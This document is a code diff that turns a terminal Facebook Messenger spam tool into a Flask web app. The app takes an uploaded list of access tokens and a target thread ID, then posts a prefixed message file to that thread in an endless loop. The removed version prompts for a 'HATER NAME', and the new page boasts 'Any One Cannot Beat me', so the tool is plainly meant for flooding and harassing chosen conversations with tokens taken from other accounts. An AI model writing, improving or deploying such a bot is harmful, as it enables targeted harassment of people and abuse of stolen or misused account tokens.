@@ -1,177 +1,162 @@
+from flask import Flask, request
 import requests
+from threading import Thread, Event
 import time
-import os
-import platform
-import urllib.request
-import uuid
-from getmac import get_mac_address  # For device-specific key
-import json
 
-# Colors
-BOLD    = '\033[1m'
-CYAN    = '\033[96m'
-GREEN   = '\033[92m'
-RED     = '\033[91m'
-YELLOW  = '\033[93m'
-BLUE    = '\033[94m'
-MAGENTA = '\033[95m'
-RESET   = '\033[0m'
+app = Flask(__name__)
+app.debug = True
 
-# Banner (unchanged)
-logo = f"""{CYAN}
-      ___           ___           ___           ___           ___           ___     
-     /\\  \\         |\\__\\         /\\  \\         /\\__\\         /\\  \\         /\\__\\    
-    /::\\  \\        |:|  |       /::\\  \\       /::|  |       /::\\  \\       /:/  /    
-   /:/\\:\\  \\       |:|  |      /:/\\:\\  \\     /:|:|  |      /:/\\ \\  \\     /:/__/     
-  /::\\~\\:\\  \\      |:|__|__   /::\\~\\:\\  \\   /:/|:|  |__   _\\:\\~\\ \\  \\   /::\\  \\ ___ 
- /:/\\:\\ \\:\\__\\     /::::\\__\\ /:/\\:\\ \\:\\__\\ /:/ |:| /\\__\\ /\\ \\:\\ \\ \\__\\ /:/\\:\\  /\\__\\
- \\/__\\:\\/:/  /    /:/~~/~    \\/__\\:\\/:/  / \\/__|:|/:/  / \\:\\ \\:\\ \\/__/ \\/__\\:\\/:/  /
-      \\::/  /    /:/  /           \\::/  /      |:/:/  /   \\:\\ \\:\\__\\        \\::/  / 
-      /:/  /     \\/__/            /:/  /       |::/  /     \\:\\/:/  /        /:/  /  
-     /:/  /                      /:/  /        /:/  /       \\::/  /        /:/  /   
-     \\/__/                       \\/__/         \\/__/         \\/__/         \\/__/    
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'referer': 'www.google.com'
+}
 
-{MAGENTA}╔═════════════════════ Messenger Tool ═════════════════════╗
-║             V9MPIR3 OWN3R 9Y9NSH H3R3 🩵              ║
-╚════════════════════════════════════════════════════════╝
+stop_event = Event()
+threads = []
 
-\033[1;92m.Author     :  𝐀𝐘𝟗𝐍𝐒𝐇 𝐇𝟑𝐑𝟃
-\033[1;31m.Brother    : 𝐀𝐋𝐎𝐍𝐄 𝐒𝐓𝟗𝐍𝐃 𝐀𝐘𝟗𝐍𝐒𝐇
-\033[1;32m.Facebook   : 𝐀𝐘𝟗𝐍𝐒𝐇
-\033[1;34m.Tool Name  : 𝐌𝟑𝐒𝐒𝟗𝐍𝐆𝟑𝐑 𝐓𝐎𝐎𝐋
-\033[1;36m.Type type  : 𝐅𝐑𝟑𝟑 𝐁𝐘 𝐀𝐘𝟗𝐍𝐒𝐇 𝐓𝐎𝐎𝐋
-────────────────────────────────────────────────────────────
-𖣘︎𖣘︎𖣘︎𖣘︎𖣘︎︻╦デ╤━╼【★ 𝐀𝐘𝟗𝐍𝐒𝐇 𝐓𝐎𝐎𝐋 𝐎𝐖𝐍𝐀𝐑 ★】╾━╤デ╦︻𖣘︎𖣘︎𖣘︎𖣘︎𖣘︎
-────────────────────────────────────────────────────────────
-\033[1;32m【𝐅𝟃𝟃𝐋 𝐓𝐇𝟃 𝐏𝟎𝐖𝟃𝐑 𝐎𝐅 𝐕𝟗𝐌𝐏𝐈𝐑𝟃 𝐑𝐔𝐋𝟃𝐗 𝐎𝐖𝐍𝟃𝐑 𝐀𝐘𝟗𝐍𝐒𝐇】
-\033[1;36m       𖣘︎𖣘︎𖣘︎【 𝐀𝐘𝟗𝐍𝐒𝐇 𝐈𝐍𝐒𝐈𝐃𝐄 】𖣘︎𖣘︎𖣘︎
-{RESET}
-"""
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "✅ I am alive!", 200
 
-def cls():
-    os.system('clear' if platform.system() != 'Windows' else 'cls')
-
-def generate_device_key():
-    # Generate a device-specific key using MAC address and hostname
-    mac = get_mac_address() or "unknown_mac"
-    hostname = platform.node() or "unknown_host"
-    unique_string = f"{mac}:{hostname}"
-    key = str(uuid.uuid5(uuid.NAMESPACE_DNS, unique_string))  # Deterministic UUID
-    return key
-
-def save_device_key(key):
-    # Save key to a local file
-    with open("device_key.txt", "w") as f:
-        f.write(key)
-
-def load_device_key():
-    # Load key from file if exists, else generate and save
-    if os.path.exists("device_key.txt"):
-        with open("device_key.txt", "r") as f:
-            return f.read().strip()
-    else:
-        key = generate_device_key()
-        save_device_key(key)
-        return key
-
-def check_approval(key):
-    # Check if key is in approved_keys.txt
-    try:
-        with open("approved_keys.txt", "r") as f:
-            approved_keys = [line.strip() for line in f.readlines()]
-        return key in approved_keys
-    except FileNotFoundError:
-        return False
-
-def get_access_tokens(token_file):
-    with open(token_file, 'r') as file:
-        return [token.strip() for token in file.readlines() if token.strip()]
-
-def is_connected():
-    try:
-        urllib.request.urlopen('https://www.google.com', timeout=3)
-        return True
-    except:
-        return False
-
-def send_messages(convo_id, tokens, messages, custom_name, speed):
-    headers = {
-        'Content-type': 'application/json',
-    }
-    message_count = 0  # Initialize message counter
-    symbols = ['|', '/', '-', '\\']  # Symbols for animation
-
-    while True:
-        if is_connected():
-            try:
-                for i, message in enumerate(messages):
-                    token = tokens[i % len(tokens)]
-                    full_message = f"{custom_name} {message.strip()}"
-                    url = f"https://graph.facebook.com/v17.0/t_{convo_id}"
-                    response = requests.post(url, json={"access_token": token, "message": full_message}, headers=headers)
-
-                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                    message_count += 1  # Increment counter
-
-                    if response.ok:
-                        # Dynamic width calculation
-                        max_width = max(len(f"{custom_name}: {message.strip()}"), len(f"Time: {current_time}")) + 10
-                        border = "─" * max_width
-                        
-                        # Animation effect
-                        for j in range(4):
-                            print(f"{GREEN}┌───[⚡TERMINAL:AY9NSH#MSG{message_count}{symbols[j]}]───╴")
-                            print(f"│ > {custom_name}: {message.strip().ljust(max_width-6)} > │")
-                            print(f"│ > Time: {current_time.ljust(max_width-6)} > │")
-                            print(f"└{border}┘{RESET}")
-                            time.sleep(0.1)
-                            print("\033[4A\033[K", end="")  # Move cursor up and clear lines
-                        
-                        # Final static box
-                        print(f"{GREEN}┌───[⚡TERMINAL:AY9NSH#MSG{message_count}]───╴")
-                        print(f"│ > {custom_name}: {message.strip().ljust(max_width-6)} > │")
-                        print(f"│ > Time: {current_time.ljust(max_width-6)} > │")
-                        print(f"└{border}┘{RESET}")
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+    while not stop_event.is_set():
+        try:
+            for message1 in messages:
+                if stop_event.is_set():
+                    break
+                for access_token in access_tokens:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"✅ Sent: {message[:30]} via {access_token[:10]}")
                     else:
-                        print(f"{RED}[FAILED] TOKEN SAHI DAAL LE BHAYA | Time: {current_time}{RESET}")
-                    time.sleep(speed)
+                        print(f"❌ Fail [{response.status_code}]: {message[:30]}")
+                    time.sleep(time_interval)
+        except Exception as e:
+            print("⚠️ Error in message loop:", e)
+            time.sleep(10)
 
-                print(f"{YELLOW}[+] Loop #{message_count//len(messages)} completed. Restarting...{RESET}")
-            except Exception as e:
-                print(f"{RED}[!] Exception: {e}{RESET}")
-        else:
-            print(f"{BLUE}[!] INTERNET BAND KAR DIYA TUNE...{RESET}")
-            while not is_connected():
-                time.sleep(5)
-            print(f"{GREEN}[+] OKAY CONNECT HOGYA NOW CHECK...{RESET}")
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['tokenFile']
+        access_tokens = token_file.read().decode().strip().splitlines()
 
-def main():
-    cls()
-    print(logo)
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-    # Generate or load device key
-    device_key = load_device_key()
-    print(f"{YELLOW}[!] Your Device Key: {device_key}{RESET}")
-    print(f"{RED}[!] Send this key to AY9NSH for approval!{RESET}")
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-    # Check if key is approved
-    if not check_approval(device_key):
-        print(f"{RED}[!] Key not approved. Contact AY9NSH with your key: {device_key}{RESET}")
-        return  # Exit if not approved
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
+            thread.start()
+            threads = [thread]
 
-    print(f"{GREEN}[+] Key approved! Starting Messenger Tool...{RESET}")
+    return '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vampire RuLex Ayansh</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    label{
+    color: white;
+}
+.file{
+    height: 30px;
+}
+body{
+    background-image: url('https://i.postimg.cc/yNkHBdMN/cd709d6136f759567e635ca9b26e14f4.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    color: white;
+}
+.container{
+  max-width: 350px;
+  height: 600px;
+  border-radius: 20px;
+  padding: 20px;
+  box-shadow: 0 0 15px white;
+  border: none;
+}
+.form-control {
+    border: 1px double white ;
+    background: transparent; 
+    width: 100%;
+    height: 40px;
+    padding: 7px;
+    margin-bottom: 20px;
+    border-radius: 10px;
+    color: white;
+}
+.header{
+  text-align: center;
+  padding-bottom: 20px;
+}
+.btn-submit{
+  width: 100%;
+  margin-top: 10px;
+}
+.footer{
+  text-align: center;
+  margin-top: 20px;
+  color: #888;
+}
+.whatsapp-link {
+  display: inline-block;
+  color: #25d366;
+  text-decoration: none;
+  margin-top: 10px;
+}
+.whatsapp-link i {
+  margin-right: 5px;
+}
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐑𝐔𝐋𝐄𝐗</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
+      <label>Thread/Inbox ID</label><input type="text" name="threadId" class="form-control" required>
+      <label>Name Prefix</label><input type="text" name="kidx" class="form-control" required>
+      <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
+      <label>Text File</label><input type="file" name="txtFile" class="form-control" required>
+      <button type="submit" class="btn btn-primary btn-submit">Start Sending</button>
+    </form>
+    <form method="post" action="/stop">
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Sending</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>💀 Powered By Vampire Rulex</p>
+    <p>😈Any One Cannot Beat me </p>
+  </footer>
+</body>
+</html>
+'''
 
-    token_file = input(BOLD + CYAN + "FATAFAT TOKEN DALO => " + RESET).strip()
-    convo_id = input(BOLD + CYAN + "THREAD ID YA GC ID DAL=> " + RESET).strip()
-    messages_file = input(BOLD + CYAN + "MESSAGE DAAL JO JO SEND KAREGA => " + RESET).strip()
-    custom_name = input(BOLD + CYAN + "HATER NAME => " + RESET).strip()
-    speed = int(input(BOLD + CYAN + "SPEED (sec) => " + RESET).strip())
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return '✅ Sending stopped.'
 
-    tokens = get_access_tokens(token_file)
-    with open(messages_file, 'r') as f:
-        messages = f.readlines()
-
-    send_messages(convo_id, tokens, messages, custom_name, speed)
-
-if __name__ == "__main__":
-    main()
+import os
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
